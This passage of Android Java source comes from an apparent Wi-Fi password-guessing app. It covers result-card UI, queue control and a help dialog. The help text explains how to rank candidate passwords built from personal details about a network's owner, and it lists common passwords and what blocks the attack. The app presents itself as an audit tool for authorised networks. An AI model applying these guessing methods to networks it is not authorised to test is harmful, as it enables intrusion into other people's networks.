         * 不如让它自己纠正 —— 只要不是在主线程，就转投过去。 */
        if (android.os.Looper.myLooper() != android.os.Looper.getMainLooper()) {
            final TaskQueue.Task t = task;
            final String o = outcome;
            ui.post(() -> showResultCard(t, o));
            return;
        }
        /* 多字典接力：文案必须由**真实计划状态**决定，不能让单字典的
         * 「换一本字典」覆盖正在进行的接力。
         *
         * 判据是 livePlan()（服务端活计划）的 state/index，不是"页面上有没有计划"——
         * 单字典模式下也可能存在别的目标的计划文件，那不该影响本卡。
         */
        {
            io.github.wlmosv_png.wpaforge.audit.DictPlan lp0 = livePlan();
            if (lp0 != null && !lp0.items.isEmpty()) {
                showPlanResultCard(task, outcome, lp0);
                return;
            }
        }
        if ("DONE_HIT".equals(outcome)) {
            resultCard.setVisibility(View.GONE);   // 命中已经有专门的命中卡
            return;
        }
        final int tested = task.testedThisRun;
        final int total = task.dictSize;
        final int inconclusive = task.missInconclusive;
        final String ssid = task.ssid == null ? "" : task.ssid;

        String title;
        int titleColor;
        if ("PAUSED".equals(outcome)) {
            title = L.s("试到第 " + Math.max(task.offset, tested) + " 条停了",
                    "Stopped at candidate " + Math.max(task.offset, tested));
            titleColor = ACCENT;
        } else if ("STOPPED".equals(outcome)) {
            title = L.s("已停止 · 试了 " + tested + " 条", "Stopped after " + tested);
            titleColor = AmberTheme.TEXT_DIM;
        } else if (tested == 0 && total > 0) {
            title = L.s("这本字典的候选都跑过了", "Every candidate here was already tried");
            titleColor = ACCENT;
        } else if (inconclusive > 0) {
            title = L.s("跑完了，但有 " + inconclusive + " 条没结论",
                    "Finished, but " + inconclusive + " had no verdict");
            titleColor = ACCENT;
        } else {
            title = L.s("这本字典里没有", "Not in this dictionary");
            titleColor = TEXT;      // 中性色：这是正常结果，不是错误
        }
        resultTitle.setText(title);
        resultTitle.setTextColor(titleColor);

        StringBuilder sub = new StringBuilder();
        sub.append(L.s("试了 " + tested + " 条", tested + " tried"));
        if (total > 0) sub.append(L.s(" · 这本共 " + total + " 条", " of " + total));
        sub.append(L.s(" · 用了 ", " \u00b7 took ")).append(fmtDuration(task.elapsedMs));
        resultSub.setText(sub.toString());

        // 「为什么」——这里必须说人话，而且优先用本机真实数据
        StringBuilder why = new StringBuilder();
        if ("PAUSED".equals(outcome)) {
            why.append(L.s("进度已经存下来了，点「继续」接着跑，不会从头再来。",
                    "Progress is saved \u2014 Resume continues from here."));
        } else if (tested == 0 && total > 0) {
            why.append(L.s("这本字典的候选以前都试过，所以这次没有可跑的新候选。"
                            + "\n换一本字典就行，已经跑过的不会重复跑。",
                    "All candidates in this dictionary were tried before, so there was nothing "
                            + "new to run. Just pick another dictionary \u2014 tried ones are skipped."));
        } else if (inconclusive > 0) {
            why.append(L.s("没结论 = 路由器没给出明确答复（信号弱、响应慢、或中途换过信道）。"
                            + "这些**不算被排除**，下次跑同一本会重新试它们。",
                    "No verdict means the router gave no clear answer (weak signal, slow reply, "
                            + "or a channel change). These are NOT ruled out and will be retried."));
        } else {
            why.append(L.s("破解是逐条试，试完没有就是没有 —— 这不是故障。"
                            + "\n家用密码最常见的是手机号、生日、门牌，这些大多不在这本字典里。",
                    "Cracking is one candidate at a time: exhausted means exhausted. "
                            + "Home passwords are usually a phone number, birthday or house "
                            + "number \u2014 most of those are not in this list."));
            String rec = localTrackRecord();
            if (!rec.isEmpty()) why.append("\n").append(rec);
            String top = topHitDictName();
            if (!top.isEmpty()) {
                why.append("\n").append(L.s("本机命中最多的是「" + top + "」—— 换这本通常更划算",
                        "Most hits on this device came from \"" + top + "\" \u2014 usually a better bet"));
            }
        }
        io.github.wlmosv_png.wpaforge.audit.TriedSet tried = triedForCurrentTarget();
        if (tried.size() > 0) {
            why.append("\n").append(L.s("本网络累计已排除 " + tried.size() + " 条（下次不会重复跑）",
                    tried.size() + " candidates ruled out on this network so far"));
        }
        if (!lastRestoreSummary.isEmpty()) {
            why.append("\n").append(L.s("收尾完成 · 原来的网络已写回（", "Wrap-up done \u00b7 previous network restored (")
                    + lastRestoreSummary + "）");
        }
        resultWhy.setText(why.toString());

        resultActions.removeAllViews();
        resultActions.addView(actionButton(L.s("填线索", "Add hints"),
                AmberTheme.BTN_PRIMARY, 0, v -> {
                    hideResultCard();
                    showSeedDialog();
                }));
        resultActions.addView(actionButton(L.s("换字典", "Bigger dict"),
                AmberTheme.BTN_SECONDARY, 8, v -> {
                    hideResultCard();
                    showDictSource();
                }));
        resultActions.addView(actionButton(L.s("先算了", "Leave it"),
                AmberTheme.BTN_NEUTRAL, 8, v -> hideResultCard()));

        resultCardTaskId = task.id;
        resultCard.setVisibility(View.VISIBLE);
        // 候选区还留着最后一条 —— 标题换成陈述事实的词，明确告诉用户已经结束。
        // 刻意不用「完成」：没找到不算完成，用「最后尝试」只说发生过什么。
        if (candLabel != null) {
            candLabel.setText(L.s("最后尝试", "LAST TRIED"));
        }
    }

    /**
     * 多字典接力的结算卡：**每一句都由真实计划/任务状态推出**。
     *
     * <p>状态映射（调用时机：本本任务已结束、计划已 apply 完成）：
     * <ul>
     *   <li>{@code RUNNING} → 计划已前进到下一本 → 「当前字典已完成，正在准备下一本」
     *       （**明确不说"正在执行"**：此刻下一本还没接管）。</li>
     *   <li>{@code PAUSED} → 「计划已暂停」+ 继续入口。</li>
     *   <li>{@code BLOCKED}/{@code ERROR} → 如实说被阻塞/出错，**不伪装成完成**。</li>
     *   <li>终态（{@code DONE_HIT}/{@code DONE_MISS}/{@code STOPPED}）→ 「多字典计划已完成」+ 最终统计。</li>
     * </ul>
     */
    private void showPlanResultCard(TaskQueue.Task task, String outcome,
            io.github.wlmosv_png.wpaforge.audit.DictPlan lp) {
        final int total = lp.items.size();
        final int idx = Math.max(1, Math.min(lp.displayIndex(), total));
        final String nextName = (lp.index + 1 < lp.items.size())
                ? lp.items.get(lp.index + 1).name : "";
        final String justName = task.dictName == null ? "" : task.dictName;

        // 状态 → 语义 → 文案：全部在 PlanResultHint（纯函数）里，界面只填空。
        final io.github.wlmosv_png.wpaforge.audit.PlanResultHint.Kind kind =
                io.github.wlmosv_png.wpaforge.audit.PlanResultHint.kindOf(lp);

        resultTitle.setText(io.github.wlmosv_png.wpaforge.audit.PlanResultHint.title(kind));
        int titleColor;
        switch (kind) {
            case DONE_HIT:  titleColor = OK_GREEN; break;
            case PAUSED:    titleColor = AmberTheme.WARN; break;
            case BLOCKED:
            case ERROR:     titleColor = DANGER; break;
            case PREPARING_NEXT: titleColor = ACCENT; break;
            default:        titleColor = AmberTheme.TEXT; break;
        }
        resultTitle.setTextColor(titleColor);
        resultSub.setText("");

        resultWhy.setText(io.github.wlmosv_png.wpaforge.audit.PlanResultHint.why(
                kind, idx, total, nextName,
                CrackService.lastSkippedConfirmed(), CrackService.lastSkippedUndetermined()));

        resultActions.removeAllViews();
        if (io.github.wlmosv_png.wpaforge.audit.PlanResultHint.isTerminalKind(kind)) {
            resultActions.addView(actionButton(L.s("\u77e5\u9053\u4e86", "Got it"),
                    AmberTheme.BTN_PRIMARY, 0, v -> hideResultCard()));
        } else {
            if (io.github.wlmosv_png.wpaforge.audit.PlanResultHint.isAbnormalKind(kind)
                    || kind == io.github.wlmosv_png.wpaforge.audit.PlanResultHint.Kind.PAUSED) {
                resultActions.addView(actionButton(L.s("\u7ee7\u7eed", "Resume"),
                        AmberTheme.BTN_PRIMARY, 0, v -> {
                            hideResultCard();
                            CrackService.start(MainActivity.this);
                        }));
            } else {
                resultActions.addView(actionButton(L.s("\u6682\u505c", "Pause"),
                        AmberTheme.BTN_SECONDARY, 0, v -> {
                            hideResultCard();
                            if (crackService != null) crackService.pause();
                        }));
            }
            resultActions.addView(actionButton(L.s("\u505c\u6b62\u8ba1\u5212", "Stop plan"),
                    AmberTheme.BTN_NEUTRAL, 8, v -> {
                        hideResultCard();
                        onStopClicked();
                    }));
        }

        resultCardTaskId = task.id;
        resultCard.setVisibility(View.VISIBLE);
        if (candLabel != null) {
            candLabel.setText(L.s("\u6700\u540e\u5c1d\u8bd5", "LAST TRIED"));
        }
    }

    /**
     * 结算卡上的按钮（**等宽单行**）。
     *
     * <p>**为什么要有这个工厂**：`AmberTheme.action()` 造出来的 Button
     * 是没有 layoutParams 的，直接 `(LinearLayout.LayoutParams) b.getLayoutParams()`
     * 拿到 null，再写 leftMargin 就 NPE。线上日志抓到过这个崩
     * （`showResultCard` 抛 NullPointerException → 结果卡没出来，
     * 界面永远停在"收尾中"，看起来就是卡死）。
     * 所以这里永远新建一套 LP 再挂上去。
     *
     * <p>**为什么是 weight=1**：三个按钮都按内容宽度排（WRAP_CONTENT）时，
     * 最右边那个会被挤窄 —— 文字折成两行、高度比另外两个高一截，整行是歪的。
     * 等宽 + `setSingleLine(true)` 后，同一行的按钮必然等高、不折行
     * （文案也要相应精简，见调用点）。
     */
    private Button actionButton(String label, int kind, int leftMarginDp,
                                android.view.View.OnClickListener l) {
        Button b = AmberTheme.action(this, dp, label, kind);
        b.setSingleLine(true);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f);
        lp.leftMargin = px(leftMarginDp);
        b.setLayoutParams(lp);
        b.setOnClickListener(l);
        return b;
    }

    private void hideResultCard() {
        if (resultCard != null) resultCard.setVisibility(View.GONE);
        /* **不重置候选区标题**。
         * 之前这里会把标题改回「当前候选」，于是用户点「先算了」之后，
         * 一张写着"已结束 · 未命中"的卡下面挂着"当前候选"——两句话打架。
         * 标题只由 startConnect（开跑）和 showResultCard（结束）两处决定。 */
    }

    /**
     * 本机**命中最多的那本字典**。
     *
     * <p>从历史记录里数出来（命中的记录带 dictName），用于在"没中"时给一条
     * **可执行的**建议 —— 而不是只说"再试试别的"。数据本来就在盘上，不用新增存储。
     *
     * @return 形如 {@code 01 内置弱口令常用（57 次）}；样本太少返回空串
     */
    private io.github.wlmosv_png.wpaforge.audit.HistStore.Summary histSummary;
    private long histSummaryAt = 0L;

    /**
     * 历史统计（带缓存）。
     *
     * <p>**不解密**：走 {@code HistStore.summary()} —— 只解析前 8 列。
     * 之前这里调了两次 {@code load()}，而 load 会对每条命中记录走一次
     * Keystore 解密（用户 107 条命中 = 200+ 次），弹窗因此卡一下。
     * 缓存 30 秒，避免反复读盘。
     */
    private io.github.wlmosv_png.wpaforge.audit.HistStore.Summary histSummary() {
        long now = System.currentTimeMillis();
        if (histSummary == null || now - histSummaryAt > 30_000L) {
            histSummary = io.github.wlmosv_png.wpaforge.audit.HistStore.summary(this);
            histSummaryAt = now;
        }
        return histSummary;
    }

    /** 本机命中最多的字典（形如 {@code 01 内置弱口令常用（57 次）}）；样本不足返回空串 */
    private String topHitDictName() {
        io.github.wlmosv_png.wpaforge.audit.HistStore.Summary s = histSummary();
        if (s.topDict.isEmpty()) return "";
        return s.topDict + L.s("（" + s.topDictHits + " 次）", " (" + s.topDictHits + " hits)");
    }

    /** 本机真实战绩：跑过多少次、命中多少次 —— 比任何安慰话都有说服力 */
    private String localTrackRecord() {
        try {
            io.github.wlmosv_png.wpaforge.audit.HistStore.Summary s = histSummary();
            if (s.runs == 0) return "";
            return L.s("本机记录：跑过 " + s.runs + " 次，命中 " + s.hits + " 次"
                            + (s.hits > 0 ? " —— 工具是能中的，只是这次方向不对。" : "。"),
                    "On this device: " + s.runs + " runs, " + s.hits + " hits.");
        } catch (Throwable t) {
            return "";
        }
    }

    private static String fmtDuration(long ms) {
        if (ms <= 0) return "—";
        long sec = ms / 1000;
        if (sec < 60) return L.s(sec + " 秒", sec + "s");
        if (sec < 3600) return L.s((sec / 60) + " 分 " + (sec % 60) + " 秒",
                (sec / 60) + "m " + (sec % 60) + "s");
        return L.s((sec / 3600) + " 小时 " + ((sec % 3600) / 60) + " 分",
                (sec / 3600) + "h " + ((sec % 3600) / 60) + "m");
    }

    /**
     * 破解原理说明（「?」入口）。
     *
     * <p>七节，按"从是什么到为什么"排：
     *   ① 它在干什么 ② 为什么不用大字典 ③ 候选从哪来（含社会工程学判断基准）
     *   ④ 判断依据（判定链） ⑤ 没中是怎么回事（+本机真实数字）
     *   ⑥ 现实里会让它失效的三件事 ⑦ 边界
     *
     * <p>末尾两个跳转直接接上已有能力（填线索 / 选字典），形成闭环。
     */
    private void showCrackHelp() {
        StringBuilder b = new StringBuilder();

        b.append(L.s("① 它在干什么\n"
                        + "把\"人可能设的密码\"按可能性从高到低，一条一条**真的去连一次**。\n"
                        + "连上了，那条就是对的。\n\n",
                "1) What it does\nRanks likely passwords and **really tries them, one by one**. "
                        + "If the join succeeds, that one is right.\n\n"));

        b.append(L.s("② 为什么不翻几十万条大字典\n"
                        + "Android 一次只能连一个网络，每条要 2~4 秒。10 万条按 3 秒算 ≈ 83 小时。\n"
                        + "所以关键不是\"字典多大\"，而是**最可能的那几十条有没有排在最前面**。\n\n",
                "2) Why not a 100k-entry list\nAndroid can only be on one network at a time, "
                        + "2\u20134s per try. 100k entries \u2248 83 hours.\n"
                        + "So it is not about list size \u2014 it is about putting the most likely "
                        + "few dozen first.\n\n"));

        b.append(L.s("③ 候选从哪来（三层）\n"
                        + "· 你填的线索（最准）：手机号 / 生日 / 姓名拼音 / 门牌\n"
                        + "  —— 这些**不在任何字典里**，只有你知道\n"
                        + "· 中文高频：5201314、woaini520、zhangwei123\n"
                        + "· 通用短表：12345678、88888888、admin123 —— 跨设备命中率最高\n\n"
                        + "为什么一个手机号只出 3 种形态？\n"
                        + "人对密码的改动**极小**：一个手机号通常只会写成 全号 / 后 8 位 / 前面加个 1。"
                        + "主流工具（CUPP、hashcat 规则集）也只做这几种。\n"
                        + "把它来回变形——截中间几位、补个零、尾号重复——只会造出**没人用过的串**，"
                        + "白占一次尝试。\n"
                        + "所以派生的准则是：**值少但准**（每个线索最多 3 条），靠"
                        + "**维度之间互拼**扩展（zhangwei + 门牌 → zhangwei802），"
                        + "而不是对单个值反复变形。\n\n",
                "3) Where candidates come from\n"
                        + "\u00b7 Your hints (most accurate): phone / birthday / pinyin / house no.\n"
                        + "  These are in no wordlist \u2014 only you know them.\n"
                        + "\u00b7 Chinese high-frequency: 5201314, woaini520, zhangwei123\n"
                        + "\u00b7 Common short list: 12345678, 88888888, admin123\n\n"
                        + "Why only 3 forms per phone number?\n"
                        + "People modify passwords **very little**. A phone number is usually "
                        + "typed as-is, its last 8 digits, or with a leading 1. Established tools "
                        + "do the same.\n"
                        + "Reshaping it (slicing the middle, padding zeros, repeating the tail) "
                        + "only produces strings **nobody ever used**.\n"
                        + "So the rule is: **few but right**, expanded by **combining facts** "
                        + "(name + house no.), not by mangling one value.\n\n"));

        b.append(L.s("④ 判断依据（本项目最讲究的地方）\n"
                        + "\"看起来连上了\" ≠ \"这条密码对\"。回连旧网、缓存凭据、旧配置，"
                        + "都能让状态显示 COMPLETED。\n"
                        + "所以只认一种证据：**SSID 逐字相等 + supplicant COMPLETED + 拿到有效 IP**，"
                        + "三条必须**来自同一行状态**。\n"
                        + "宁可报\"不确定\"，也不报\"成功\"。\n\n",
                "4) How success is decided (the strict part)\n"
                        + "\"It looks connected\" \u2260 \"this password is right\". Reconnecting to "
                        + "an old network, cached credentials or stale config can all show COMPLETED.\n"
                        + "So only one piece of evidence counts: **SSID exact match + supplicant "
                        + "COMPLETED + a valid IP**, all three **from the same status line**.\n"
                        + "It would rather say \"unknown\" than claim a false success.\n\n"));

        StringBuilder miss = new StringBuilder();
        miss.append(L.s("⑤ 没中是怎么回事\n"
                        + "· 没中是**常态**，不是故障\n"
                        + "· 三种没中要分开：这本里确实没有 / 有 N 条没结论（**不算排除**）/ 没跑完\n"
                        + "· 试过的会被记住（**按网络分开**），换字典不会重复跑\n",
                "5) What \"no match\" means\n"
                        + "\u00b7 No match is the **normal** outcome, not a failure\n"
                        + "\u00b7 Three kinds: truly not in this list / N inconclusive "
                        + "(**not ruled out**) / not finished\n"
                        + "\u00b7 Tried candidates are remembered **per network**, so switching "
                        + "lists does not re-run them\n"));
        String rec = localTrackRecord();
        if (!rec.isEmpty()) miss.append(L.s("\n本机记录：", "\nOn this device: ")).append(rec);
        String top = topHitDictName();
        if (!top.isEmpty()) {
            miss.append(L.s("\n本机命中最多的是「" + top + "」—— 换这本通常更划算",
                    "\nMost hits here came from \"" + top + "\""));
        }
        b.append(miss).append("\n\n");

        b.append(L.s("⑥ 现实里会让它失效的三件事\n"
                        + "· 目标开了 **WPA3 / PMF**：靠\"猜密码去连\"打不动，会一直失败\n"
                        + "· 密码**不在候选集合**里：跑完也没中 → 补线索，或换更大的字典\n"
                        + "· **信号弱 / 距离远**：会出现大量\"没结论\"——不是密码错，是没拿到证据\n\n",
                "6) Three real-world blockers\n"
                        + "\u00b7 Target uses **WPA3 / PMF**: guessing by connecting will just fail\n"
                        + "\u00b7 The password is **not in the candidate set**: add hints or use "
                        + "a bigger list\n"
                        + "\u00b7 **Weak signal / far away**: lots of \"inconclusive\" results \u2014 "
                        + "not a wrong password, just no evidence\n\n"));

        b.append(L.s("⑦ 边界\n只用于**你自己拥有或已获授权**的网络。对别人的网就是违法。",
                "7) Scope\nFor networks **you own or are explicitly authorised to test** only."));

        io.github.wlmosv_png.wpaforge.ui.NetDialog d =
                new io.github.wlmosv_png.wpaforge.ui.NetDialog(this,
                        L.s("这是怎么破解的？", "How does this work?"), b.toString());
        d.addItem(L.s("去填线索（提高命中率）", "Add hints (raises hit rate)"),
                dd -> showSeedDialog());
        d.addItem(L.s("怎么选字典", "Which wordlist to pick"), dd -> showDictSource());
        d.setPositive(L.s("知道了", "Got it"), null);
        d.show();
    }

    /** 一条淡分隔线，用于把顶部状态卡里的几行分开 */
    private View divider() {
        View v = new View(this);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, Math.max(1, px(0.6f)));
        lp.topMargin = px(9);
        lp.bottomMargin = px(1);
        v.setLayoutParams(lp);
        v.setBackgroundColor(AmberTheme.HAIRLINE);
        return v;
    }

    /** 底部操作按钮（默认白字） */
    private Button primaryAction(String label, int bg) {
        return primaryAction(label, bg, Color.WHITE);
    }

    /** 底部操作按钮：可指定文字色（琥珀底必须用深色，白字对比度不够） */
    private Button primaryAction(String label, int bg, int fg) {
        Button b = new Button(this);
        b.setText(label);
        b.setAllCaps(false);
        b.setTextSize(AmberTheme.FS_ACTION);
        b.setTextColor(fg);
        b.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        b.setMinWidth(0); b.setMinimumWidth(0);
        b.setMinHeight(0); b.setMinimumHeight(0);
        b.setStateListAnimator(null);
        b.setPadding(px(8), px(15), px(8), px(15));
        b.setBackground(roundBg(bg, AmberTheme.RADIUS_BTN));
        return b;
    }

    private LinearLayout.LayoutParams actParams(int rightMargin, float weight) {
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                0, ViewGroup.LayoutParams.WRAP_CONTENT, weight);
        lp.rightMargin = px(rightMargin);
        return lp;
    }

    /**
     * 把当前内存里的候选写成一个真实文件，返回路径。
     *
     * 目录用 DictStore.defaultDir（跟字典管理页同一个），文件名固定，
     * 下次生成会覆盖 —— 不会堆一堆临时文件。
     */
    private String persistGeneratedDict() {
        if (currentDict == null || currentDict.isEmpty()) return "";
        File dir = io.github.wlmosv_png.wpaforge.audit.DictStore.defaultDir(this);
        if (dir == null) return "";
        if (!dir.exists() && !dir.mkdirs()) return "";
        // 规范名走 DerivedDicts：历史上有过 `00 内置生成器.txt` 这第二个名字，
        // 结果目录里长期躺着两份同样的内容
        String genName = io.github.wlmosv_png.wpaforge.audit.DerivedDicts.generatorName();
        purgeSameGroup(dir, genName + ".txt");
        File out = new File(dir, genName + ".txt");
        try (java.io.BufferedWriter w = new java.io.BufferedWriter(
                new java.io.OutputStreamWriter(new java.io.FileOutputStream(out), "UTF-8"))) {
            for (Candidate c : currentDict) {
                w.write(c.password);
                w.write("\n");
            }
        } catch (Exception e) {
            android.util.Log.w("WPAForge", "persistGeneratedDict 失败: " + e);
            return "";
        }
        appendStream(L.s("内置字典已落地: ", "Generated dictionary saved: ")
                + out.getAbsolutePath() + "（" + currentDict.size() + L.s(" 条）", " entries)"));
        return out.getAbsolutePath();
    }

    /** 暂停 / 继续 的统一入口 */
    private void onPauseResumeClicked() {
        TaskQueue.Task pausedTask = null, runningTask = null;
        for (TaskQueue.Task t : queueCache) {
            if (t.state == TaskQueue.State.PAUSED && pausedTask == null) pausedTask = t;
            if (t.state == TaskQueue.State.RUNNING && runningTask == null) runningTask = t;
        }
        if (pausedTask != null && runningTask == null) {
            resumeTask(pausedTask);
            appendStreamColored(L.s("▶ 恢复执行…", "▶ Resuming…"), OK_GREEN);
        } else if (runningTask != null) {
            CrackService svc = liveService();
            if (svc != null) svc.pause();
            appendStreamColored(L.s("‖ 正在暂停…（进度保留）",
                    "‖ Pausing… (progress kept)"), ACCENT);
            refreshQueue();
        } else {
            Toast.makeText(this, L.s("当前没有正在跑的任务", "No task is running"),
                    Toast.LENGTH_SHORT).show();
        }
    }

    /** 停止的统一入口 */
    private void onStopClicked() {
        boolean active = false;
        for (TaskQueue.Task t : queueCache) {
            if (t.state == TaskQueue.State.RUNNING
                    || t.state == TaskQueue.State.PENDING
                    || t.state == TaskQueue.State.PAUSED) { active = true; break; }
        }
        if (!active) {
            Toast.makeText(this, L.s("当前没有正在跑的任务", "No task is running"),
                    Toast.LENGTH_SHORT).show();
            return;
        }
        // **先改队列**，再通知服务。顺序很重要：
        // 队列是 UI 的唯一真相，先改这里，用户点完立刻能看到状态变化，
        // 不会出现「点了没反应，过几秒才停」的观感。
        for (TaskQueue.Task t : queueCache) {
            if (t.state == TaskQueue.State.RUNNING
                    || t.state == TaskQueue.State.PENDING
                    || t.state == TaskQueue.State.PAUSED) {
                t.state = TaskQueue.State.STOPPED;
                TaskQueue.update(this, t);
            }
        }
        // 再让工作线程退出当前那条。
        // 它会阻塞到当前候选等完（每条最多几秒），
        // 但队列状态已经是停止，界面不会再显示"进行中"。
        CrackService svc = liveService();
        if (svc != null) {
            svc.stopAll();
        }
        CrackService st = CrackService.get();
        if (st != null && st != svc) st.stopAll();
        appendStreamColored(L.s("■ 正在中止…", "■ Stopping…"), DANGER);
        refreshQueue();
    }

    /**
     * 从「权威」重建 目标 / 字典 的**显示状态**（2026-10-24 反馈修复）。
     *
     * <h3>原来的问题</h3>
     * 目标与字典只存在 Activity 的内存字段里。系统在后台把 Activity 回收、
     * 用户再回来（或暂停后继续）时，Activity 是新建的：字段为空 →
     * 顶上两张卡显示「未选择目标 / 未选择字典」，而服务其实正拿着它们跑。
     * 这是**显示没有单一权威**的典型症状：真实的权威（服务 + 持久化队列）
     * 一直好好的，只有界面自己忘了。
     *
     * <h3>现在的做法（权威 + 派生显示）</h3>
     * <ol>
     *   <li><b>目标</b>：内存里没有 → 取「服务正在跑的任务」，再退到「队列里第一个
     *       RUNNING/PAUSED 任务」，用 {@code task.toNetRecord()} 还原；</li>
     *   <li><b>字典</b>：优先直接用**服务正在使用的**那份候选列表（与引擎同源，
     *       零成本）；服务不在或没在跑，就用任务里的 {@code dictName/dictSize}
     *       先把名字与条数显示出来，同时**后台**按 {@code dictPath} 读盘补齐列表
     *       （列表还要给「开始」用，所以必须补，但不该卡住界面）；</li>
     *   <li><b>只在缺失时才覆盖</b>：用户本次已经选好的目标/字典绝不被动过 ——
     *       否则「我明明选了别的」会被运行中的任务顶掉。</li>
     * </ol>
     * 本方法是幂等的，可以在绑定服务、队列变化、回前台、切回本页时重复调用。
     */
    private void restoreSelectionFromAuthority() {
        // ① 目标
        if (targetNet == null || targetNet.ssid == null || targetNet.ssid.isEmpty()) {
            TaskQueue.Task t = activeTaskForDisplay();
            if (t != null && t.ssid != null && !t.ssid.isEmpty()) {
                try {
                    targetNet = t.toNetRecord();
                    Prefs.setTarget(this, targetNet.bssid, targetNet.ssid);
                    updateTargetLabel();
                    refreshSkippedForCurrentDict();
                } catch (Throwable ignored) {}
            }
        }

        // ①½ 计划模式恢复：进程被杀/重进页面后，若服务端正在跑多字典计划
        // （planForDisplay 非空且未终态），把界面切回计划模式，别让用户误以为还是单本。
        //
        // P0：终态计划（已命中/全部跑完/已停止）**不再抢占**模式与字典通道 ——
        // 否则用户永远回不到普通单字典选择。终态只做提示，由用户显式清理或重选。
        if (!usePlanMode) {
            CrackService svc0 = liveService();
            io.github.wlmosv_png.wpaforge.audit.DictPlan livePlan =
                    svc0 == null ? null : svc0.planForDisplay();
            if (livePlan != null && !livePlan.items.isEmpty() && !livePlan.state.isTerminal()) {
                usePlanMode = true;
                selectedPlan = livePlan;
                updateDictStatus();
                updateConnectDict();
            }
        }

        // ② 字典
        if ((currentDict == null || currentDict.isEmpty()) && !dictReloading) {
            CrackService svc = liveService();
            java.util.List<Candidate> engineDict = svc == null ? null : svc.dictForDisplay();
            if (engineDict != null && !engineDict.isEmpty()) {
                // 与引擎同一份：直接采用（这就是权威）
                currentDict = engineDict;
                dictSizeShown = engineDict.size();
                TaskQueue.Task t = svc.current();
                if (t != null) {
                    if (currentDictName == null || currentDictName.isEmpty()) {
                        currentDictName = t.dictName == null ? "" : t.dictName;
                    }
                    if (currentDictPath == null || currentDictPath.isEmpty()) {
                        currentDictPath = t.dictPath == null ? "" : t.dictPath;
                    }
                }
                // 权威重建之后必须把工作台一起带上，否则会出现
                // 「破解页有字典、审计页说没有」这种前后不一致。
                syncWorkbenchDict();
            } else {
                TaskQueue.Task t = activeTaskForDisplay();
                if (t != null) {
                    if (currentDictName == null || currentDictName.isEmpty()) {
                        currentDictName = t.dictName == null ? "" : t.dictName;
                    }
                    if (currentDictPath == null || currentDictPath.isEmpty()) {
                        currentDictPath = t.dictPath == null ? "" : t.dictPath;
                    }
                    if (t.dictSize > 0) dictSizeShown = t.dictSize;

                    final String path = currentDictPath;
                    final String name = currentDictName;
                    if (path != null && !path.isEmpty()) {
                        dictReloading = true;
                        new Thread(() -> {
                            java.util.List<Candidate> reloaded = null;
                            try {
                                reloaded = io.github.wlmosv_png.wpaforge.audit.DictStore.load(
                                        new java.io.File(path), 0);
                            } catch (Throwable ignored) {}
                            final java.util.List<Candidate> r = reloaded;
                            ui.post(() -> {
                                dictReloading = false;
                                if (r != null && !r.isEmpty()
                                        && (currentDict == null || currentDict.isEmpty())) {
                                    currentDict = r;
                                    dictSizeShown = r.size();
                                    currentDictName = name;
                                    syncWorkbenchDict();
                                }
                                updateConnectDict();
                                updateDictStatus();
                            });
                        }, "wpaforge-dict-reload").start();
                    }
                }
            }
        }

        updateTargetLabel();
        updateConnectDict();
        updateConnectMode();
        updateDictStatus();
    }

    /**
     * 显示用的「活动任务」：正在跑的优先，其次队列里第一个 RUNNING/PAUSED。
     * <p>只用于重建显示；不改队列、不改任何状态。
     */
    private TaskQueue.Task activeTaskForDisplay() {
        CrackService svc = liveService();
        if (svc != null) {
            TaskQueue.Task cur = svc.current();
            if (cur != null) return cur;
        }
        for (TaskQueue.Task t : queueCache) {
            if (t.state == TaskQueue.State.RUNNING || t.state == TaskQueue.State.PAUSED) return t;
        }
        return null;
    }

    /** 执行方式：仅 Root，点击只弹提示 */
    /** 空状态提示 */
    private void updateEmptyHint() {
        if (connectEmptyHint == null) return;
        boolean empty = streamBuffer.length() == 0;
        // （SpannableStringBuilder 同样有 length()，无需改动语义）
        connectEmptyHint.setVisibility(empty ? View.VISIBLE : View.GONE);
        if (empty) {
            if (!streamLines.isEmpty()) {
                // 有日志、但当前级别把它们全筛掉了 —— 这跟「没有日志」是两回事，
                // 不能让用户以为任务没在动。
                connectEmptyHint.setText(L.s(
                        "已按「关键」筛选\n共 " + streamLines.size() + " 行 · 点「全部」查看",
                        "Filtered to Key\n" + streamLines.size()
                                + " lines · tap “All” to view"));
            } else {
                boolean ready = targetNet != null && currentDict != null && !currentDict.isEmpty();
                // U2：这里**必须**看队列状态，不能只看「有没有选目标」。
                // 否则会出现「顶部：已暂停」+「日志区：准备就绪，点开始」同屏矛盾
                // （真机 2026-11-02 实测）。
                TaskQueue.State qs = currentQueueState();
                String hint;
                if (qs == TaskQueue.State.PAUSED) {
                    hint = L.s("已暂停 · 进度已保留\n点下面的「▶ 继续」接着跑",
                            "Paused · progress kept\nTap “▶ Resume” below to continue");
                } else if (qs == TaskQueue.State.PENDING) {
                    hint = L.s("正在准备…", "Preparing…");
                } else if (qs == TaskQueue.State.RUNNING) {
                    hint = L.s("正在跑，结果会出现在这里", "Running - results appear here");
                } else if (ready) {
                    hint = L.s("准备就绪\n点下面的「▶ 开始」",
                            "Ready\nTap “▶ Start” below");
                } else {
                    hint = L.s("先选目标和字典\n（点上面两行可以更换）",
                            "Pick a target and a dictionary first\n(tap the lines above to change)");
                }
                // 空状态里带一句「看原理」—— 还没跑过的人最需要它
                connectEmptyHint.setText(hint
                        + L.s("\n\n右上角「?」看它是怎么破解的",
                                "\n\nTap “?” at the top right to see how it works"));
            }
        }
    }

    /** 智能排序开关外观 */
    private void updateSmartToggle() {
        if (smartToggle == null) return;
        if (smartSortEnabled) {
            smartToggle.setText("智能排序: 已开启\n"
                    + L.s("按目标 SSID 与设备特征重排，让最可能的口令排在最前", "Reorder by target SSID and device traits so the likeliest passphrases come first"));
            smartToggle.setTextColor(OK_GREEN);
            smartToggle.setBackground(roundBg(AmberTheme.OK_BG, AmberTheme.RADIUS_CARD));
        } else {
            smartToggle.setText("智能排序: 已关闭\n"
                    + L.s("按字典原始顺序依次尝试", "Try in the dictionary's original order"));
            smartToggle.setTextColor(TEXT_DIM);
            smartToggle.setBackground(roundBgStroked(SURFACE, AmberTheme.EDGE, AmberTheme.RADIUS_CARD, 0.8f));
        }
    }

    /** 目标派生开关外观 */
    private void updateTargetDictToggle() {
        if (targetDictToggle == null) return;
        if (targetDictEnabled) {
